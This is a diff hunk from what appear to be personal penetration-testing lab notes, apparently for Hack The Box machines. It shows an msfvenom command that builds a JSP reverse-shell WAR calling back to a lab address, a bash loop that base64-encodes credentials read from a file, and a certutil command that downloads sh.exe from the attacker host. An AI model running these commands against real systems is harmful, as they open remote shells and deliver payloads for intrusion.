@@ -139,4 +139,8 @@ Java server pages web shell
 
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.26 LPORT=4444 -f war >shell.war
 
+#### video : 
+for cred in $(cat file.txt);do echo -n $cred | base64; done    . example of 1 line bash
+
+certutil  -urlcache -f http://10.10.14.26/sh.exe   // download over certutil (WIN) 
 ### Nibbler
